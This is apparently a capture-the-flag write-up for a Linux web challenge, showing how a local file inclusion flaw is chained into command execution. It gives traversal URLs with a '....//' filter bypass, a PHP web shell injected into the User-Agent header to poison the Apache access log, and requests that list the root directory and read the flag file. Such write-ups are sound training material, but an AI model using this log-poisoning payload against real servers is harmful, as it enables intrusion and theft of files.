# Solution

Read the apache2 logs using lfi /var/log/apache2/access.log .
http://01.linux.challenges.ctf.thefewchosen.com:60886/var/log/apache2/access.log

Then return to the main page and capture the request with burp. 
Then put <?php system(\$_GET['cmd']);?> in the User-Agent  param.

Read the logs again and you'll see the contents of the root dir if we reqquest:
http://01.linux.challenges.ctf.thefewchosen.com:60886/?file=....//....//....//....//....//....//var/log/apache2/access.log&cmd=ls%20/

Do the exact same thing again but replace the ls / with cat hidden_fl4g.txt . Read the logs again and you'll see the flag in the log file.
curl http://01.linux.challenges.ctf.thefewchosen.com:60886/?file=....//....//....//....//....//....//var/log/apache2/access.log&cmd=cat%20/hidden_fl4g.txt
